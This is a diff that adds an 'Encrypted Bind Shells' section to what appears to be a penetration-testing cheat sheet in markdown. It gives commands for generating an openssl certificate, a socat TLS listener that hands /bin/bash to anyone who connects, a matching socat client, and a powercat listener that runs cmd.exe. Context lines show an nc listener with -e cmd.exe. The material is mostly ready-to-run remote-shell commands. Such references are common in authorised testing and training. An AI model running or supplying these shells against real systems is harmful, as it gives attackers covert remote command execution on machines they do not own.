@@ -28,6 +28,35 @@ powercat -c 127.0.0.1 -p 7002
 nc -nlvp 51337 -e cmd.exe
 ```
 
+## Encrypted Bind Shells
+
+* `socat`:
+
+```bash
+# Generate a certificate
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+# Convert into a format socat will accept
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+
+* Listener:
+
+```bash
+socat OPENSSL-LISTEN:$PORT,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+```
+
+* Client:
+
+```bash
+socat - OPENSSL:$IP:$PORT,verify=0
+```
+
+* `powercat`:
+
+```powershell
+powercat -l -p $PORT -e cmd.exe
+```
+
 ## Reverse Shells
 
 ### Socat
